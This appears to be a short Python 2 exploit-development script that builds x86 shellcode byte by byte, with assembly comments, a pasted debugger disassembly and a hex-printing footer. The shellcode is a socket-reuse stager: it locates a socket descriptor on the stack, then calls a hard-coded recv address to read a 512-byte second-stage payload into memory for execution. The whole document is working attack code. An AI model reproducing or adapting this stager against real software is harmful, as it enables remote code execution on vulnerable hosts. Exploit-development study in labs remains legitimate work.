x = "\x8b\xc4" # mov eax, esp
x += "\x8B\xEC" # mov ebp, esp

# setting esp to be higher than eip
x += "\x66\x83\xE8\x4A" # sub ax, 0x4a 

# mov esp, eax
x += "\x8b\xe0"

# buffer space
x += "\x90"*4

# get socket descriptor pointer
x += "\x66\x05\xd2\x01" # add ax, 0x1d2

# mov ebx, dword ptr [eax]
x += "\x8b\x18"

#xor eax, eax
x += "\x33\xc0"

# PUSH EAX, pushing flags
x += "\x50" 

# ADD ah, 0x2 - size 0x200 (512)
x += "\x80\xC4\x02"

# PUSH EAX, pushing size
x += "\x50"               

# mov eax, esp
x += "\x8b\xc4"

# add ax, 0x231
x += "\x66\x05\x31\x02"

# PUSH EAX, pushing buffer pointer
x += "\x50"   

#x += "\x90"*4 

# push ebx, socket descriptor
x += "\x53"

# mov eax, 0x40252c20
x += "\xB8\x20\x2C\x25\x40"

# shr eax, 0x8
x += "\xC1\xE8\x08"

# call eax
x += "\xff\xd0"

"""
00BFF9C4   8BEC             MOV EBP,ESP
00BFF9C6   8BC4             MOV EAX,ESP
00BFF9C8   66:05 8801       ADD AX,188
00BFF9CC   8B18             MOV EBX,DWORD PTR DS:[EAX]
00BFF9CE   33C0             XOR EAX,EAX
00BFF9D0   50               PUSH EAX
00BFF9D1   66:05 0004       ADD AX,400
00BFF9D5   50               PUSH EAX
00BFF9D6   8BC4             MOV EAX,ESP
00BFF9D8   66:83E8 4A       SUB AX,4A
00BFF9DC   8BE0             MOV ESP,EAX
00BFF9DE   66:05 3004       ADD AX,430
00BFF9E2   90               NOP
00BFF9E3   90               NOP
00BFF9E4   90               NOP
00BFF9E5   8BC4             MOV EAX,ESP
00BFF9E7   66:83E8 4A       SUB AX,4A
00BFF9EB   90               NOP
00BFF9EC   90               NOP

"""

print (x.encode('hex'))
print("Length: {}".format(len(x)))